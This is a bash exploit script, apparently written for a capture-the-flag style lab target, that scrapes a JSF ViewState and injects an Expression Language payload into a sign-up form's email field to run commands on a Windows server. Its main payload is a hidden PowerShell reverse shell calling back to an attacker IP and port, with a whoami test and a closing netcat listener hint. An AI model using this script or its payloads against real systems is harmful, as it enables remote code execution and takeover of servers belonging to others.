#!/bin/bash

# ============================================================================
# DIRECT CURL RCE - WINDOWS POWERSHELL
# ============================================================================

TARGET="http://10.129.228.116:8080/userSubscribe.faces"
ATTACKER_IP="10.10.16.187"
ATTACKER_PORT="4444"

echo "[*] Getting ViewState..."
VIEWSTATE=$(curl -s "$TARGET" | grep -oP 'value="\K[a-zA-Z0-9+/=]+(?=")' | head -1)

if [ -z "$VIEWSTATE" ]; then
    echo "[-] Could not get ViewState"
    exit 1
fi

echo "[+] ViewState obtained"
echo ""

# ============================================================================
# METHOD 1: PowerShell Reverse Shell
# ============================================================================
echo "[*] Sending PowerShell reverse shell..."

PS_CMD='powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "$client=New-Object System.Net.Sockets.TCPClient('"'"'$ATTACKER_IP'"'"',$ATTACKER_PORT);$stream=$client.GetStream();[byte[]]$buffer=0..65535|%{0};while(($i=$stream.Read($buffer,0,$buffer.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'"'"'PS '"'"'+(pwd).Path+'"'"'> '"'"';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'

EL_PAYLOAD='${Runtime.getRuntime().exec(new String[]{"cmd.exe","/c","'"$PS_CMD"'"})}'

curl -s -X POST "$TARGET" \
  -d "j_id_jsp_1623871077_1:email=$EL_PAYLOAD" \
  -d "j_id_jsp_1623871077_1:submit=SIGN UP" \
  -d "j_id_jsp_1623871077_1_SUBMIT=1" \
  -d "javax.faces.ViewState=$VIEWSTATE" \
  > /dev/null

echo "[+] Payload sent!"
echo ""

# ============================================================================
# METHOD 2: Simple test
# ============================================================================
echo "[*] Sending test command (whoami)..."

TEST_EL='${Runtime.getRuntime().exec(new String[]{"cmd.exe","/c","whoami"})}'

curl -s -X POST "$TARGET" \
  -d "j_id_jsp_1623871077_1:email=$TEST_EL" \
  -d "j_id_jsp_1623871077_1:submit=SIGN UP" \
  -d "j_id_jsp_1623871077_1_SUBMIT=1" \
  -d "javax.faces.ViewState=$VIEWSTATE" \
  > /dev/null

echo "[+] Test sent!"
echo ""
echo "[*] Check your listener: nc -nlvp $ATTACKER_PORT"
